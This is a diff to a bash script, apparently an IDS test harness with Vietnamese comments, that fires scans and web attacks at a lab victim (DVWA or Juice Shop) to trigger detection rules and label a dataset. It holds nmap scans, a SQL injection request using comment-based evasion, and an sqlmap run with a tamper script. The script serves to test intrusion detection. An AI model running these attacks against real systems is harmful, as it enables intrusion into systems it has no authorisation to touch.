@@ -23,6 +23,7 @@ VICTIM="${VICTIM:-192.168.100.30}"
 HTTP_PORT="${HTTP_PORT:-80}"          # 80 (DVWA) hoac 3000 (Juice Shop)
 SSH_USER="${SSH_USER:-user}"          # tai khoan test tren victim
 STEP_DELAY="${STEP_DELAY:-3}"         # nghi giua cac scenario o che do all
+WITH_SQLMAP="${WITH_SQLMAP:-0}"       # 1 = sql_evasion chay them sqlmap (nhieu alert hon)
 
 B="\033[1m"; G="\033[32m"; Y="\033[33m"; N="\033[0m"
 info()  { echo -e "${B}[*]${N} $*"; }
@@ -41,7 +42,7 @@ Scenario (cung ten voi capture_dataset.sh):
   sql_injection  sql_evasion  command_injection  xss
   icmp_flood  dns_anomaly
 
-Bien ghi de: VICTIM, HTTP_PORT, SSH_USER, STEP_DELAY
+Bien ghi de: VICTIM, HTTP_PORT, SSH_USER, STEP_DELAY, WITH_SQLMAP=1
 Vi du:  VICTIM=192.168.100.30 ./attack_runner.sh syn_scan
 EOF
 }
@@ -95,9 +96,11 @@ s_syn_scan() {
 }
 
 s_port_scan() {
-  label "PORT SCAN  -> Rule 10003 PORT_SCAN"
+  label "PORT SCAN (connect)  -> Rule 10003 PORT_SCAN"
   have nmap || { warn "thieu nmap"; return; }
-  sudo nmap -sS -p 1-100 "$VICTIM"
+  # -sT = connect() scan: bat tay day du tren cong mo roi dong ngay, khong gui
+  # du lieu. Khac ky thuat voi syn_scan (-sS half-open) nen IDS phan biet duoc.
+  nmap -sT -p 1-100 "$VICTIM"
 }
 
 s_service_scan() {
@@ -122,8 +125,11 @@ s_sql_evasion() {
   have curl || { warn "thieu curl"; return; }
   # Bien the dung inline comment de test buoc normalization xoa comment.
   curl -s "http://${VICTIM}:${HTTP_PORT}/index.php?id=1%20UNION/**/SELECT/**/1,2" >/dev/null
-  if have sqlmap; then
-    info "Chay them sqlmap --tamper=space2comment (tuy chon)..."
+  # sqlmap chi chay khi WITH_SQLMAP=1: payload kiem tra WAF cua sqlmap chua ca
+  # <script> va /etc/passwd nen sinh them alert 10006/10007 (khong con dung
+  # ground truth "chi 10005").
+  if [ "${WITH_SQLMAP:-0}" = "1" ] && have sqlmap; then
+    info "Chay them sqlmap --tamper=space2comment (WITH_SQLMAP=1)..."
     sqlmap -u "http://${VICTIM}:${HTTP_PORT}/index.php?id=1" \
            --tamper=space2comment --batch --flush-session >/dev/null 2>&1 || true
   fi
